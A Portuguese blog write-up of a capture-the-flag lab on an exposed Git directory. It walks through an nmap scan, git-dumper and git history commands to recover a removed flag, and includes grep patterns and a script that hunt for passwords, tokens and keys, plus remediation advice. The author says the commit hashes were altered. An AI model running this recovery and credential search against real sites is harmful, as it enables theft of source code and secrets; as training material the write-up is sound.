---
title: Git Exposed - Fundamentos e Exploração
description: 'Explorando vulnerabilidade Git Exposed, desde conceitos fundamentais até práticos via hacking club'
author: matheus
tags: ["hackingclub", "WriteUps", "git", "information disclosure", "source code analysis"]
categories: ["SecLab", "Hacking"]
pin: false
comments: true

---

# 📝 Git Exposed (HackingClub Machine)

### Fundamentos do Git, Versionamento e Exploração de Repositórios Expostos

Essa máquina do Hacking Club foi  bem rápida de resolver, mas achei que valia a pena usar ela como desculpa pra explicar direito como funciona o Git e principalmente essa vulnerabilidade de Git Exposed que é super comum por aí. Vou focar bastante nas explicações porque mesmo sendo "simples", tem muita coisa interessante acontecendo nos bastidores.

## 1. Fundamentos do Git e Versionamento

### 1.1 O que é Git?

O **Git** é basicamente o cara que cuida do histórico do seu código. Foi o Linus Torvalds que criou em 2005 (o mesmo cara do Linux), e hoje praticamente todo mundo usa. A ideia é simples:

- **Rastreamento de alterações:** Cada modificação é registrada com timestamp, autor e descrição
- **Trabalho colaborativo:** Múltiplos desenvolvedores podem trabalhar simultaneamente
- **Branches:** Linhas paralelas de desenvolvimento para features e experimentos
- **Histórico completo:** Acesso a qualquer versão anterior do código
- **Backup distribuído:** Cada clone contém todo o histórico do projeto

### 1.2 Como o Git funciona internamente

O Git armazena informações em uma estrutura chamada **repositório**, que fica na pasta `.git/` do projeto:

```
.git/
├── HEAD              # Ponteiro para branch atual
├── config            # Configurações do repositório
├── description       # Descrição do projeto
├── hooks/            # Scripts de automação
├── info/             # Informações adicionais
├── logs/             # Logs de referências
├── objects/          # Banco de dados de objetos
├── refs/             # Referências (branches, tags)
└── index             # Área de staging
```

**Como o Git guarda as coisas:**

O Git tem 4 tipos de "objetos" principais (meio chato, mas é importante saber):

- **Blob:** O conteúdo dos seus arquivos
- **Tree:** Como os arquivos estão organizados nas pastas
- **Commit:** Um "snapshot" do projeto inteiro em um momento específico
- **Tag:** Marcações tipo "versão 1.0", "release final"

**Esses códigos malucos do Git:**

Cada coisa no Git ganha um código único de 40 caracteres (hash SHA-1). É tipo um CPF pra cada commit. Por exemplo:

- `a1b2c3d4e5f6...` é o "CPF" de um commit específico
- O Git pega os 2 primeiros caracteres pra fazer uma pasta
- Os outros 38 viram o nome do arquivo dentro da pasta

Isso é importante pra entender como conseguimos baixar o repositório depois.

### 1.3 Comandos Git essenciais

```bash
# Visualizar histórico de commits
git log

# Ver alterações específicas de um commit
git show <hash_do_commit>

# Comparar diferenças entre commits
git diff <commit1> <commit2>

# Ver status atual do repositório
git status

# Ver configuração atual
git config -l
```

### 1.4 Conceitos de segurança no Git

**Informações sensíveis comumente expostas:**

- **Credenciais:** Senhas, tokens de API, chaves SSH
- **URLs de produção:** Endpoints internos, IPs de servidores
- **Configurações:** Database strings, secrets de aplicação
- **Código comentado:** Funcionalidades "escondidas", backdoors
- **Histórico de desenvolvimento:** Bugs, vulnerabilidades corrigidas

**Por que o histórico é perigoso:**

Mesmo que você remova informações sensíveis do código atual, elas permanecem no histórico Git. Um `git log` pode revelar:

- Commits com mensagens como "removing password" ou "fixing security issue"
- Diferenças (`git diff`) mostrando exatamente o que foi removido
- Todas as versões anteriores do código

## 2. A Vulnerabilidade Git Exposed

### 2.1 O que é Git Exposed?

**Git Exposed** é quando alguém esquece de bloquear o acesso à pasta `.git/` no servidor. Aí qualquer um pode baixar o repositório inteiro, incluindo:

- Código fonte completo
- Histórico de commits
- Credenciais que podem ter sido commitadas
- Informações sobre a arquitetura do sistema

### 2.2 Como acontece na prática

**Como isso acontece na vida real:**

1. **Deploy na pressa:** Pegou a pasta do projeto e jogou tudo no servidor (inclusive o .git/)
2. **Nginx/Apache mal configurado:** Esqueceu de bloquear acesso aos arquivos .git
3. **Script de deploy zuado:** CI/CD copiando tudo sem filtro
4. **Desenvolvedor junior:** Não sabia que .git/ é perigoso expor

**Detecção automática:**

Scanners como Nmap podem detectar automaticamente:

```bash
nmap -sC -sV target.com
# Script NSE http-git detecta .git/ expostos
```

### 2.3 Impacto de segurança

**Riscos críticos:**

- **Information Disclosure:** Código fonte completo revelado
- **Credential Exposure:** Senhas, tokens e chaves expostos no histórico
- **Architecture Mapping:** Compreensão completa da aplicação
- **Vulnerability Research:** Análise de código para encontrar bugs
- **Supply Chain Attacks:** Informações sobre dependências e infraestrutura

## 3. Enumeração e Reconhecimento

### 3.1 Informações da máquina alvo

**Target:** `10.10.0.14` (HackingClub - Git Exposed)

**O que encontrei inicialmente:**

- Site básico pedindo um "token de acesso"
- O que eu digitava aparecia na URL como `?token=alguma_coisa`
- Sempre dava "Token Errado :p" (suspeito né?)

### 3.2 Scan de rede e serviços

Como sempre, comecei com um nmap bem completo pra não perder tempo:

```bash
nmap -F -Pn -sV -A 10.10.0.14 -vv
```

**Explicando os parâmetros:**

- `-F` (Fast): Escaneia apenas as 100 portas mais comuns
- `-Pn`: Pula a descoberta de host (assume que está ativo)
- `-sV`: Detecção de versão dos serviços
- `-A`: Ativa detecção de OS e execução de scripts NSE
- `-vv`: Verbose duplo para output detalhado

### 3.3 Resultados da varredura

**Descobertas importantes:**

```text
PORT 80/tcp OPEN http
SERVICE: nginx 1.18.0
NSE: http-git: 10.10.0.14/.git/ Git repository found!
Last commit message: Removendo flag
```

**Cara, que sorte:**

O próprio nmap já achou o **.git/ exposto** e a mensagem *"Removendo flag"* **entregou tudo**  

**Já deu pra sacar:**

O script do nmap já me entregou a vulnerabilidade de bandeja e já me falou onde encontrar a flag. Ou seja, se tem um repositório Git exposto e a mensagem do último commit é "Removendo flag", sabemos que ela já teve no código e alguém tentou "escondê-la". Só que esqueceram que Git guarda histórico de tudo, o que não seria necessariamente um problema se não tivessem colocado o .git no servidor de produção, né...

## 4. Explorando o Git Exposed

### 4.1 Verificação manual

Primeiro, vamos confirmar manualmente o que encontramos:

```bash
curl -I http://10.10.0.14/.git/
```

**Resultado esperado:**

```text
HTTP/1.1 403 Forbidden
```

**Coisa interessante:** Mesmo que `.git/` dê 403, às vezes os arquivos dentro dele estão liberados, nesse caso seria quase como se  trancassem as portas enquanto deixavam as janelas abertas.

### 4.2 Entendendo o comportamento da aplicação

Testando a aplicação principal:

```bash
# Testando parâmetro token
curl "http://10.10.0.14/?token=teste"
# Resultado: "Token Errado :p"

curl "http://10.10.0.14/?token="
# Resultado: "Token Errado :p"
```

**Hipótese:** A aplicação é um simples script PHP que compara o token fornecido com um valor específico. Se for diferente, mostra erro. A flag provavelmente era o token correto que foi removido do código, já sabemos que a mensagem de sucesso atualmente não será a flag mais.

### 4.3 Ferramentas para dump de repositórios Git

**GitDumper - Ferramenta especializada:**

O `git-dumper` é uma ferramenta Python que explora Git Exposed fazendo requests inteligentes para reconstruir o repositório:

```bash
# Instalação
git clone https://github.com/arthaud/git-dumper
cd git-dumper
pip3 install -r requirements.txt
python3 git_dumper.py

# Criando alias para facilitar uso
echo 'alias git-dumper="python3 ~/tools/git-dumper/git_dumper.py"' >> ~/.bashrc
source ~/.bashrc
```

**Como o GitDumper funciona na prática:**

1. **Tenta arquivos conhecidos:** HEAD, index, config - os "arquivos padrão" do Git
2. **Baixa o índice:** O arquivo que tem a lista de tudo que existe no repo
3. **Puxa os objetos:** Com a lista em mãos, baixa todos os arquivos um por um
4. **Reconstrói tudo:** Monta um repositório Git funcional na sua máquina

Basicamente ele faz o que a gente faria manualmente, mas automatizado.

## 5. Extraindo o repositório Git

### 5.1 Executando git-dumper

```bash
git-dumper http://10.10.0.14/ git_dump
```

**Output esperado:**

```text
[-] Testing http://10.10.0.14/.git/HEAD [200]
[-] Testing http://10.10.0.14/.git/ [403]
[-] Fetching common files
...
[-] Fetching .git/logs/HEAD [200]
[-] Fetching .git/refs/heads/master [200]
[-] Fetching .git/index [200]
[-] Fetching objects
....
[+] Repository successfully dumped
```

**Saiu exatamente como esperado:**

- `.git/` → 403 Forbidden (pasta bloqueada)
- `.git/HEAD` → 200 OK (arquivo dentro da pasta liberado)
- `.git/objects/xx/xxxx...` → 200 OK (outros arquivos liberados também)

Isto confirma a configuração furada: bloquearam só a listagem da pasta, mas esqueceram dos arquivos dentro dela.

### 5.2 Explorando o repositório baixado

```bash
cd git_dump
ls -la
```

**Arquivos encontrados:**

```text
drwxr-xr-x .git/
-rw-r--r-- index.php
```

**Analisando o código da aplicação:**

```bash
cat index.php
```

```php
<?php
if(isset($_GET['token']) and !empty($_GET['token'])){
if($_GET['token'] == "Sup3rAdminT0k3n") {
    echo "Get the flag: [REDACTED]";
}else{
    echo "Token errado :p";
}
```

**Exato, como eu imaginava:**

✅ Script PHP bem básico mesmo  
✅ A flag é mostrada via `echo` ao colocar o token `Sup3rAdminT0k3n`
✅ Trocaram a flag no echo por `[REDACTED]`  

Agora é só caçar no histórico Git qual era a flag original que aparecia no echo!

## 6. Análise do histórico Git

### 6.1 Explorando a estrutura .git manualmente

Antes de usar comandos Git, vamos entender o que foi baixado:

```bash
cd .git
ls -la
```

**Estrutura baixada:**

```text
HEAD                 # Referência atual
config              # Configuração do repositório
description         # Descrição
logs/               # Logs de referências
objects/            # Banco de dados de objetos
refs/               # Referências (branches)
index               # Área de staging
```

**Investigando objetos:**

```bash
cd objects
ls -la
```

**Exemplo de estrutura:**

```text
drwxr-xr-x 0c/     # Pasta com hash iniciando em "0c"
drwxr-xr-x 2c/     # Pasta com hash iniciando em "2c" 
drwxr-xr-x 31/     # Pasta com hash iniciando em "31"
drwxr-xr-x 7e/     # Pasta com hash iniciando em "7e"
drwxr-xr-x 03/     # Pasta com hash iniciando em "03"
```

```bash
ls 7e/
# b5abd9b86eae8e1cf2c808ebb3220286374337 (resto do hash do commit "Removendo flag")
```

**Como funciona essa organização maluca:**

- Hash completo: `7eb5abd9b86eae8e1cf2c808ebb3220286374337` (40 caracteres)
- O Git pega os 2 primeiros: `7e/` (vira nome da pasta)
- O resto: `b5abd9b86eae8e1cf2c808ebb3220286374337` (vira nome do arquivo)
- Juntando: `7e` + `b5abd9b86eae8e1cf2c808ebb3220286374337` = hash completo de novo

### 6.2 Explorando logs

```bash
cat logs/HEAD
```

**Output típico:**

```text
0000000000000000000000000000000000000000 0336e992ad297e7c3303bb67128bee28a6a20d0f john <cvieira.eduardo@gmail.com> 1630681862 -0300 commit (initial): First commit
0336e992ad297e7c3303bb67128bee28a6a20d0f 7eb5abd9b86eae8e1cf2c808ebb3220286374337 john <cvieira.eduardo@gmail.com> 1630681860 -0300 commit: Removendo flag
```

**Informações extraídas:**

- Hash do commit inicial: `0336e992ad297e7c3303bb67128bee28a6a20d0f`
- Hash do commit que removeu flag: `7eb5abd9b86eae8e1cf2c808ebb3220286374337`
- Autor: john <cvieira.eduardo@gmail.com>
- Data: Fri Sep 3 12:11:08 2021 -0300
- Mensagens dos commits: "First commit" e "Removendo flag"

### 6.3 Usando comandos Git para análise

```bash
# Visualizar histórico completo
git log --oneline
```

**Output:**

```text
7eb5abd Removendo flag
0336e99 First commit
```

**Visualizar log detalhado:**

```bash
git log
```

**Output detalhado:**

```text
commit 7eb5abd9b86eae8e1cf2c808ebb3220286374337
Author: john <cvieira.eduardo@gmail.com>
Date: Fri Sep 3 12:11:08 2021 -0300

    Removendo flag

commit 0336e992ad297e7c3303bb67128bee28a6a20d0f
Author: john <cvieira.eduardo@gmail.com>  
Date: Fri Sep 3 12:10:42 2021 -0300

    First commit
```

## 7. Encontrando a flag

### 7.1 Analisando o commit que removeu a flag

Agora vamos ver exatamente o que foi alterado no commit "Removendo flag":

```bash
git show 7eb5abd9b86eae8e1cf2c808ebb3220286374337
```

**Output revelador:**

```diff
commit 7eb5abd9b86eae8e1cf2c808ebb3220286374337
Author: john <cvieira.eduardo@gmail.com>
Date: Fri Sep 3 12:11:08 2021 -0300

    Removendo flag

diff --git a/index.php b/index.php
index 0336e99..7eb5abd 100644
--- a/index.php
+++ b/index.php
@@ -2,7 +2,7 @@
 <?php
 if(isset($_GET['token']) and !empty($_GET['token'])){
 if($_GET['token'] == "Sup3rAdminT0k3n") {
-    echo "Get the flag: CS{G1t_3Xp0s3d_4tt4ck}";
+    echo "Get the flag: [REDACTED]";
 }else{
     echo "Token errado :p";
```

**🚩 BINGO! FLAG ACHADA!**

```text
CS{G1t_3Xp0s3d_4tt4ck}
```

### 7.2 Entendendo o que aconteceu

**Análise da mudança:**

1. **Linha removida:** `echo "Get the flag: CS{G1t_3Xp0s3d_4tt4ck}";`
2. **Linha adicionada:** `echo "Get the flag: [REDACTED]";`
3. **Flag revelada:** `CS{G1t_3Xp0s3d_4tt4ck}` (que estava sendo mostrada no echo)

**Classic mistake:**

O desenvolvedor só trocou a flag no echo por `[REDACTED]`, mas deixou a condicional com `Sup3rAdminT0k3n` (que nem é uma flag válida). Esqueceu que Git é tipo portal da transparência do governo - fica tudo registrado. Todo mundo que baixar o repositório vai conseguir ver exatamente o que foi mudado no echo.

## 8. Verificando a solução

### 8.1 Testando a flag

Agora que temos a suposta flag, vamos verificá-la. Saber o token `Sup3rAdminT0k3n` não vai funcionar para termos certeza da flag, mas como capturamos a flag do commit podemos já testar como resposta. Até então o pensamento era de que deu certo, mas também pode ser um falso positivo, visto que não segue os padrões das flags do hackingclub.

Aplicação depois e antes do último commit:

```bash
# Versão do último commit
curl "http://10.10.0.14/?token=Sup3rAdminT0k3n"
# Resultado: "Get the flag: [REDACTED]"

# Versão anterior ao último commit
curl "http://10.10.0.14/?token=Sup3rAdminT0k3n"
# Resultado: "Get the flag: CS{G1t_3Xp0s3d_4tt4ck}" 
```

**Testando na máquina do hackingclub:**

 - Flag com formato diferente `CS{**}` do padrão `hackingclub{****}`;

 - **Resultado**> Realmente FUNCIONOU!! ✅

    **Motivo aparente**: Essa máquina era de treinamento da **CrowSec** (responsável pelo hackingclub) e por isso a flag tem formato diferente usando CS.

**Resultado:**
A flag `CS{G1t_3Xp0s3d_4tt4ck}` - que foi encontrada no histórico de commit no Git - **NÃO** era falso positivo, era real. O padrão da flag somente era diferente mesmo por se tratar da antiga plataforma.

✅ **Máquina resolvida! Easy peasy.**

### 8.2 Métodos alternativos de análise 

 Poderão ser úteis para outros casos

**Visualizando diferenças entre commits:**

```bash
# Comparar commit atual com anterior
git diff HEAD~1 HEAD

# Comparar commits específicos
git diff 0336e99 7eb5abd
```

**Visualizando arquivo em versão específica:**

```bash
# Ver index.php antes da remoção da flag
git show 0336e99:index.php
```

**Buscando por padrões no histórico:**

```bash
# Procurar por "flag" em todos os commits
git log --grep="flag" -i

# Buscar mudanças que contenham "CS{ - busca por PADRÃO" 
git log -S "CS{" --source --all
```

## 9. Técnicas de Git Forensics

### 9.1 Análise profunda do histórico

**Encontrando arquivos deletados:**

```bash
# Ver todos os arquivos que já existiram
git log --all --full-history -- "*"

# Encontrar quando um arquivo foi deletado
git log --diff-filter=D --summary
```

**Analisando mudanças específicas:**

```bash
# Ver apenas mudanças em linhas específicas
git log -L 1,5:index.php

# Encontrar quando uma string foi introduzida/removida
git log -S "password" --source --all -p
```

### 9.2 Recuperação de dados sensíveis

**Procurando por credenciais comuns:**

```bash
# Buscar padrões de credenciais no histórico
git log --all -p | grep -i "password\|secret\|token\|api_key"

# Buscar por URLs de database
git log --all -p | grep -E "(mysql|postgres|mongodb)://.*:[^@]*@"

# Procurar por chaves SSH/crypto
git log --all -p | grep -E "(BEGIN.*KEY|ssh-rsa|ssh-ed25519)"
```

**Analisando metadados:**

```bash
# Ver informações de todos os commits
git log --format=fuller

# Verificar configurações sensíveis
git config -l

# Ver informações do repositório remoto
git remote -v
```

### 9.3 Automação de análise

**Script para busca automatizada:**

```bash
#!/bin/bash
# git_secrets_scanner.sh

echo "=== Git Secrets Scanner ==="

# Padrões sensíveis comuns
patterns=(
    "password.*="
    "secret.*="
    "token.*="
    "api_key.*="
    "database.*url"
    "private.*key"
    "-----BEGIN"
    "ssh-rsa"
    "mysql://"
    "postgres://"
)

for pattern in "${patterns[@]}"; do
    echo "Searching for: $pattern"
    git log --all -p -i --grep="$pattern" --
    git log --all -p -S "$pattern" -i --
done
```

## 10. Como evitar essa cagada

### 10.1 A regra de ouro

**NUNCA coloque .git/ em produção.** Ponto final.

O problema todo acontece porque alguém fez deploy da pasta completa do projeto. A solução é óbvia:

```bash
# ❌ ERRADO: Copiar tudo
cp -r meu-projeto/ /var/www/html/

# ✅ CERTO: Só os arquivos necessários
rsync --exclude='.git' meu-projeto/ /var/www/html/
```

### 10.2 Deploy do jeito certo

**Regra simples:** Build local → Upload só o que precisa

```bash
# Exemplo básico de deploy seguro
git archive HEAD | tar -x -C /pasta-temporaria/
rsync /pasta-temporaria/ servidor:/var/www/html/
```

**Se ainda assim cagou:**

```nginx
# Nginx: bloquear .git como emergência
location ~ /\.git {
    deny all;
    return 403;
}
```

### 10.3 Não 'commite' merda

**Coisas que JAMAIS devem ir pro Git:**

```gitignore
.env
config/database.php
*.key
*.pem
passwords.txt
...
```

**Se já commitou alguma senha:**

```bash
# BFG remove do histórico inteiro
java -jar bfg.jar --replace-text passwords.txt
git reflog expire --expire=now --all
git gc --prune=now --aggressive
```

⚠️ **Aviso:** Isso reescreve todo o histórico. Só faz se realmente precisar.

## 11. Resumo da parada

**O que rolou:**

1. Alguém fez deploy com .git/ junto
2. Nmap achou automaticamente
3. git-dumper baixou tudo
4. `git show` revelou a flag no histórico

**Lição:** Git nunca esquece de nada. Se commitou, tá lá pra sempre, a não ser que force uma limpeza.

**Moralzinha:**

- Deploy = só arquivos de produção
- .gitignore = seu melhor amigo
- Git Exposed = mais comum do que deveria (hackerone que o diga)

---

**🚩 Flag capturada:** `CS{G1t_3Xp0s3d_4tt4ck}`

**Técnicas utilizadas:**

- Git Repository Enumeration
- Historical Code Analysis
- Automated Repository Reconstruction

### Referências úteis

- [GitDumper](https://github.com/arthaud/git-dumper) - Ferramenta pra baixar .git exposto
- [BFG Repo-Cleaner](https://rtyley.github.io/bfg-repo-cleaner/) - Limpar histórico Git
- [GitLeaks](https://github.com/zricethezav/gitleaks) - Scanner de secrets
- [Hacking Club](https://app.hackingclub.com/) - Onde fiz essa máquina

**Nota educacional:** Essa máquina mostra como uma configuração boba (colocar .git/ em produção) pode vazar todo o histórico de desenvolvimento. As hashes dos commits foram alteradas (mantive o início igual) para dar erro em quem só copia os comandos sem entender, mas a flag tá aí mesmo haha.

## 12. Resolução em VÍDEO

Resolução desta máquina documentada em vídeo, foi postado no youtube caso prefira acompanhar a resolução da máquina em áudio visual:

<iframe width="560" height="315" src="https://www.youtube.com/embed/vP4L4LUKzwA?si=uB3uchNY8mWLx2b8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

 - Problema com o vídeo? então clique [aqui](https://www.youtube.com/watch?v=vP4L4LUKzwA) para ver diretamente do youtube.